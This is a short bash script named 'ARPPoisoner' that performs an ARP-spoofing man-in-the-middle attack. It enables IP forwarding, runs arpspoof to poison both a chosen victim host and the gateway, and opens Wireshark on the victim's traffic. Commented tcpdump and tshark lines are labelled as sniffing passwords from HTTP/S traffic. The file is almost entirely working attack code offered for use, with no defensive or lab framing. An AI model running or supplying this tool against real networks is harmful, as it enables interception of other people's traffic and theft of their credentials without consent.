#!/bin/bash

# Act as Proxy:
# fragrouter -B1

echo "*****************************************************"
echo "***      ARPPoisoner  v0.1 (c) 2024 by suuhm      ***"
echo "-----------------------------------------------------"
echo; echo "Usage $(basename $0) <VICTIM-IP> <GATEWAY/HOST>"
echo "*****************************************************"
echo; sleep 2

if [ "$2" != "" ]; then
   GW=$2
else
   GW=$(route | grep default | awk '{print $2}')
fi

VIC=$1
[ -z $VIC ] && echo "No Target host set, exit!" && exit 1

NDEV=$(ip l show | grep 'state UP' | head -n1 | cut -d ':' -f2)

echo; sysctl net.ipv4.conf.eth0.forwarding=1
echo; sleep 1
echo "Spoofing arp to host $VIC and GW = $GW :"
sleep 3
echo
qterminal -e "arpspoof -i $NDEV -c own -t $VIC -r $GW" &
echo -e "\n\a"
# -r means bidirectional poisoning!

echo "Starting tcpdump"

#tcpdump -i $NDEV icmp
# Sniff some pw's on http/s traffic
# tshark -i ath0 -x -Y "http.request" dst host IPROUTER and dst port 80
#tcpdump -A src $VIC and '(tcp port 80) or (tcp port 443)'

#tcpdump -vvvv host $VIC and not multicast and not arp

#wireshark
wireshark -i $NDEV -k -Y "ip.addr==${VIC} && !tcp.analysis.retransmission && !tcp.analysis.fast_retransmission && !tcp.analysis.duplicate_ack"

#endling and rearping vics
sleep 3 ; killall arpspoof && sleep 2

echo "Bye.."
exit 0
